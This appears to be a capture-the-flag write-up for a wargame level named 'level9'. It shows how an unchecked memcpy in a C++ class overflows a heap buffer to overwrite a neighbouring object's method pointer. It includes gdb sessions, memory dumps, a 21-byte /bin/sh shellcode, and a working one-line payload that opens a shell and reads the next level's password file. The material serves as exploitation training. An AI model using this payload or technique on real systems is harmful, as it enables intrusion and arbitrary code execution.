This is c++ code

A class N contains:
- a pointer (we call it P) default to the address of a pointer pointing to the method operator+
- followed by a buffer (we call it B) of 100 octets initialized to the provided constructor parameter
- a method setAnnotation that dangerously performs a memcpy (no length check) of the provided string parameter at this + 4 (meanning in B)

Main:
- expect a parameter or would exit
- 2 N (we call them N1 and N2) are intantiated in main 
- the method setAnnotation is called on N1 with the provided parameter
- then P of N2 is dereferenced and call as a method

Remarque:
on the heap, both instance are close to each other
N1
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   --> break *0x0804861c
   ==> eax = 0x804a008
N2
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   --> break *0x0804863e
   ==> eax = 0x804a078

0x0804a078 âˆ’ 0x0804a008 = 0x70 = 112

The buffer of N1 starts with a 0x4 offset, by overflowing with a padding of 112-4 = 108, we reach the address of N2

We experiment with this payload

```bash
$ gdb ./level9 
...
(gdb) run $(python2 -c "print 108*'A' + 'BBBB'")
Starting program: /home/user/level9/level9 $(python2 -c "print 108*'A' + 'BBBB'")

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()

(gdb) x/100x 0x0804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x42424242	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
```

We segfault on
```bash
(gdb) disas main
=> 0x08048682 <+142>:	mov    (%eax),%edx
```

at this line, `eax` is dereferenced in `edx` but for now, `eax` is not a valid address.

```bash
(gdb) i r eax
eax            0x42424242	1111638594
```

so we replace 0x42424242 (= 'BBBB' in the payload) with a valid address we can write in e.g. 0x804a07c (the following address == the address of B of N2)
and we also add something at this address (e.g. 'CCCC')
We also add a breakpoint just after the final call to the fonction we are trying to control.

```bash
(gdb) disas main
...
=> 0x08048693 <+159>:	call   *%edx
...
(gdb) run $(python2 -c "print 108*'A' + '\x08\x04\xa0\x7c'[::-1] + 'CCCC'")
...
(gdb) x/100x 0x0804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x0804a07c	0x43434343	0x00000000	0x00000000
(gdb) i r edx
edx            0x43434343	1128481603
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

As expected the program segfaults while trying to call a method which address would be stored at `0x804a07c`. For now we've just stored the placeholder address `0x43434343`.
We change this address to `0x804a00c`, and we can add a shellcode at this same address in our payload.

The shellcode (size = 21)
'\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

padding (108 - 21 = 87)

```bash
./level9 $(python2 -c "print '\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A'*87 + '\x08\x04\xa0\x7c'[::-1] + '\x08\x04\xa0\x0c'[::-1]")
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
